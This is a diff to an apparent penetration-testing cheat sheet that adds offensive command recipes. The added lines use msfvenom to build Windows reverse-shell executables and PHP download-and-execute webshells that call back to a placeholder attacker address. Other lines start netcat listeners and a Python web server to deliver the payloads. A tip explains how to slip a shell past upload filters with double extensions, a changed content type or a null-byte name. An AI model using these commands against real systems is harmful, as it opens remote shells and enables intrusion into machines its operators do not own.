@@ -383,12 +383,21 @@ searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
 searchsploit -t Apache | grep -v '/dos/'
 ```
 
-#Shellcode
+### Shellcode
 ```
 # Binary
 msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f exe -o shell.exe
 nc -lvnp 4444
 
+# PHP Download Execute
+msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
+python -m SimpleHTTPServer 80
+nc -lvnp 443
+```
+
+### Webshell
+```
 # PHP Download Execute
 msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
@@ -402,6 +411,9 @@ msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
 # ASP
 msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
 nc -lvnp 443
+
+Use burp when trying to upload files. Try shell.php.jpeg and change the content type, modify the upload name, or use a nullbyte
+shell.php%00.jpeg
 ```
 ----------------------------------------------------------------------------
 
